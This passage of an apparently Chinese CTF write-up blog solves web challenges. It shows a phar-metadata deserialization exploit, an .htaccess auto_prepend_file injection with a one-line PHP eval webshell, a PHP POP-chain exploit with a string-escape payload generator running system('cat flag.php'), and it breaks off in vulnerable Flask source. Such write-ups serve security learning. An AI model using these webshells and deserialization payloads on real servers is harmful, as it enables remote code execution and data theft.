<span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=<span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files,<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;web1.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>改后缀上传，然后在删除页面抓包，phar伪协议读出flag</p>
<h2 id="10-羊城杯-2020-easyphp"><a href="#10-羊城杯-2020-easyphp" class="headerlink" title="10.[羊城杯 2020]easyphp"></a>10.[羊城杯 2020]easyphp</h2><p>打开就有源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>);  </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123; </span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123; </span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">        <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>; </span><br><span class="line">        <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>; </span><br><span class="line">        <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>);  </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123; </span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>具体内容就是传入文件名字，然后文件内容会被输出在文件，加上一句hellow world</p>
<p>直接试着写一个🐎</p>
<?php @eval($_POST[%27a%27]);?>

<p>ok，失败了，悲</p>
<p>这里直接输出了，写的可执行内容被注释掉了</p>
<p>这里可能是后台设置了对php文件的解析，这里只能解析index.php</p>
<p>但是index没办法被修改，卡住了，搜搜题看看</p>
<p>查到了</p>
<h3 id="php-value-auto-append-file"><a href="#php-value-auto-append-file" class="headerlink" title="php_value auto_append_file"></a>php_value auto_append_file</h3><p>如果需要将文件require到所有页面的顶部与底部。</p>
<p>第一种方法：在所有页面的顶部与底部都加入require语句。<br>例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>(``<span class="string">&#x27;header.php&#x27;</span>``);</span><br><span class="line"><span class="comment">//页面正文内容部分</span></span><br><span class="line"><span class="keyword">require</span>(``<span class="string">&#x27;footer.php&#x27;</span>``);</span><br></pre></td></tr></table></figure>

<p>但这种方法如果需要修改顶部或底部require的文件路径，则需要修改所有页面文件。而且需要每个页面都加入require语句，比较麻烦。</p>
<p>第二种方法：使用auto_prepend_file与auto_append_file在所有页面的顶部与底部require文件。</p>
<p>php.ini中有两项：</p>
<p>auto_prepend_file 在页面顶部加载文件<br>auto_append_file 在页面底部加载文件</p>
<p>使用这种方法可以不需要改动任何页面，当需要修改顶部或底部require文件时，只需要修改auto_prepend_file与auto_append_file的值即可。</p>
<p>在这里可以加载文件</p>
<p>在文件底部写入#<?php system('cat /fla*');?></p>
<p>#是.hatccess文件特有的写入形式</p>
<p>使用</p>
<p>php_value auto_prepend_file .htaccess</p>
<p>写入.htaccess文件内，此时会显示.htaccess文件的内容，输出</p>
<p>绕过这里的过滤可以使用\去绕过</p>
<h2 id="UUCTF-ezpop"><a href="#UUCTF-ezpop" class="headerlink" title="[UUCTF]ezpop"></a>[UUCTF]ezpop</h2><p>给了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ob=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;t;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pdata</span>=<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pdata</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line">    <span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data_replace</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>给了源码，传入一个data&#x3D;尝试下</p>
<p>O:5:”UUCTF”:4:{s:4:”name”;s:3:”exp”;s:3:”key”;N;s:8:”basedata”;N;s:2:”ob”;N;}</p>
<p>传入的部分来到了exp这里</p>
<p>分析类里面的联系</p>
<p>nothing的die函数会返还一个字符串触发tostring();</p>
<p>然后触发rce();</p>
<p>这里的wakeup（）方法会过滤a传入的东西</p>
<p>由于php版本为7.4，不能修改成员数量去绕过，这里选择指针</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=&amp;b</span><br></pre></td></tr></table></figure>

<p>类似b为a的指针，后面修改b的时候会一并修改a</p>
<p>exp如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ob=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="string">&quot;exp&quot;</span>));</span><br><span class="line"><span class="comment">//$nothing=new nothing();</span></span><br><span class="line"><span class="comment">//$nothing-&gt;a=&quot;echo (&#x27;die&#x27;)&quot;;</span></span><br><span class="line"><span class="comment">//serialize($nothing);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="variable">$exp</span>=<span class="keyword">new</span> <span class="title function_ invoke__">nothing</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;a=&amp;<span class="variable">$exp</span>-&gt;b;</span><br><span class="line"><span class="variable">$exp</span>-&gt;t=<span class="keyword">new</span> <span class="title function_ invoke__">output</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;t-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">youwant</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;t-&gt;a-&gt;cmd=<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\ &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后没法直接传入，这里需要编码base64，转换</p>
<p>O:5:”UUCTF”:4:{s:4:”name”;s:3:”exp”;s:3:”key”;N;s:8:”basedata”;N;s:2:”ob”;N;}</p>
<p>O:7:”nothing”:3:{s:1:”a”;N;s:1:”b”;R:2;s:1:”t”;O:6:”output”:1:{s:1:”a”;O:7:”youwant”:1:{s:3:”cmd”;s:23:”system(‘cat flag.php’);”;}}}</p>
<p>对照我们的payload和直接输出的data</p>
<p>插入点是exp的地方</p>
<p>“;s:3:”key”;N;s:8:”basedata”:s:176:”Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjIzOiJzeXN0ZW0oJ2NhdCBmbGFnLnBocCcpOyI7fX19”;s:2:”ob”;N;}”</p>
<p>这里需要用字符串逃逸</p>
<h2 id="php反序列化字符串逃逸"><a href="#php反序列化字符串逃逸" class="headerlink" title="php反序列化字符串逃逸"></a>php反序列化字符串逃逸</h2><p>反序列化的过程是有一定识别范围的，在这个范围之外的字符都会被忽略，不影响反序列化的正常进行。而且可以看到反序列化字符串都是以<code>&quot;;&#125;</code>结束的，那如果把<code>&quot;;&#125;</code>添入到需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就相应的丢弃了。</p>
<p>反序列化的时候php会根据s所指定的字符长度去读取后边的字符。如果指定的长度错误则反序列化就会失败</p>
<p>可以反序列化类中不存在的元素</p>
<p> $data_replace&#x3D;str_replace(“hacker”,”loveuu!”,$data);</p>
<p>这里运行后会让每一个hacker变成loveuu！</p>
<p>这里可以构造特定长度恶意语句，将正常的序列化数据挤出原定的pdata内，从而被恶意解析</p>
<p>一个hacker可以多一个字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;&quot;;s:3:&quot;key&quot;;s:5:&quot;UUCTF&quot;;s:8:&quot;basedata&quot;;s:176:&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjIzOiJzeXN0ZW0oJ2NhdCBmbGFnLnBocCcpOyI7fX19&quot;;s:2:&quot;ob&quot;;N;&#125;&quot;&#x27;</span></span><br><span class="line">b=<span class="built_in">len</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b*<span class="string">&quot;hacker&quot;</span>+a)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43431158/article/details/108210822">参考</a></p>
<h2 id="11-DASCTF-2023-ezweb"><a href="#11-DASCTF-2023-ezweb" class="headerlink" title="11.DASCTF 2023 ezweb"></a>11.DASCTF 2023 ezweb</h2><p>打开给了源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> 